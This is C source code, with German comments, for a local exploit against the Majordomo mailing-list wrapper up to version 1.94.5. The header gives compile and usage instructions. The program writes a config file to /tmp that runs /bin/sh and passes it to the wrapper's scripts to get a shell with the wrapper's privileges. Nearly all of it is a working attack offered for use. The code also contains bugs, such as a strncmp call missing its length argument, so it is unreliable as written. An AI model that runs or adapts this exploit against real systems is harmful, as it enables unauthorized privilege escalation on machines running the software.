/*
		MAJORDOMO - EXPLOIT F�R LINUX
		    getestet bis v1.94.5
		  programmiert von Morpheus
		  
    Der Exploit basiert auf der fehlerhaften Nutzung von Majordomo-
    Skripten. Standardm��ig wird vom Exploit das "bounce-remind"-Skript
    verwandt. Bei Erfolg liefert der Exploit eine Shell mit einer uid
    und gid dem Majordomo Wrapper entsprechend gesetzt.
    Getestet wurde der Exploit auf SuSE Linux 6.0 / 6.3 (CeBIT-Version).		    

    Zur Kompilierung des Exploits:
    
    	gcc major.c -o major    
    
    Zur Nutzung des Exploits:
    
    Wenn der Exploit <major> hei�t dann einfach ./major eingeben. Es
    sollte gen�gen. Wenn dann keine Shell gestartet wird, bitte die
    Fehlermeldungen beachten. Entweder ist die Majordomo-Version nicht
    "kompatibel" oder das Majordomo-Skript ist nicht vorhanden. Dann
    sollte man entweder ./major auto eingeben, so dass der Exploit
    alle verwundbaren Skripts ausprobiert, oder man gibt ./major <skript>
    ein, wobei <skript> durch ein verwundbares Majordomo-Skript zu ersetzen
    ist. Um die Hilfe-�bersicht zu bekommen, einfach ./major -h eingeben.
		    

    Programmiert von Morpheus [BrightDarkness] '00
    URL:  www.brightdarkness.de
    Mail: morpheusbd@gmx.net

    
    Dieser Bug in Majordomo wurde nicht von mir entdeckt. Ich habe nur
    zu diesem Bug den entsprechenden Exploit programmiert.
*/

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

#define MAJORDOMO	"/usr/lib/majordomo/wrapper"
#define SHELL 		"system(\"/bin/sh\")"
#define MORPHEUS	"/tmp/morpheus"
#define WRAPPER		"wrapper"

void intro(void);
void usage(char *arg);

int main(int argc, char **argv)
  {
    char skript[30];
    char *skripte[40];
    int i = 0;    
    int file;

    skripte[1] = "bounce-remind";
    skripte[2] = "archive2.pl";
    skripte[3] = "config-test";
    skripte[4] = "digest";
    skripte[5] = "majordomo";
    skripte[6] = "request-answer";
    skripte[7] = "resend";
        
    if ((argc == 2) && (strcmp(argv[1], "-h") == 0))
      usage(argv[0]);
    
    if (argc == 2)
      strncpy(skript,argv[1], strlen(skript));
    else
      strcpy(skript, "bounce-remind");
    
    if ((file = open(MORPHEUS, O_WRONLY|O_TRUNC|O_CREAT, 0600)) < 0)
      {
        perror(MORPHEUS);
        exit(1);
      }
    write(file, SHELL, strlen(SHELL));
    close(file);

    intro();
    if (strncmp(skript, "auto") == 0)
      {
        for (i = 1; i <= 7; i++)
          {
            printf("using : %s\n", skripte[i]);
            if (execl(MAJORDOMO, WRAPPER, skripte[i], "-C", MORPHEUS, 0) == -1) perror("EXECL");
          }
      }
    else
      {
        printf("using : %s\n", skript);
        if (execl(MAJORDOMO, WRAPPER, skript, "-C", MORPHEUS, 0) == -1) perror("EXECL");      
      }        
    return 0;
  }

void intro(void)
  {
    printf("\033[2J\033[1;1H");
    printf("\033[1;33mExploit-Code f�r Majordomo Wrapper <= v1.94.5\n");
    printf("\033[1;32mProgrammiert von Morpheus [BrightDarkness] '00\n");
    printf("\033[1;31mURL:  \033[1;32mwww.brightdarkness.de\n");
    printf("\033[1;31mmail: \033[1;32mmorpheusbd@gmx.net\n");
    printf("\033[0;29m");
  }

void usage(char *arg)
  {
    intro();
    printf("\033[1;34m");
    printf("Hilfe f�r dieses Programm :\n");
    printf("Benutzung : %s -h           Help screen\n", arg);
    printf("            %s auto         Trying all scripts automatically\n", arg);
    printf("            %s <skriptname> Tries just this <script>\n", arg);
    printf("\033[0;29m");
    exit(0);
  }
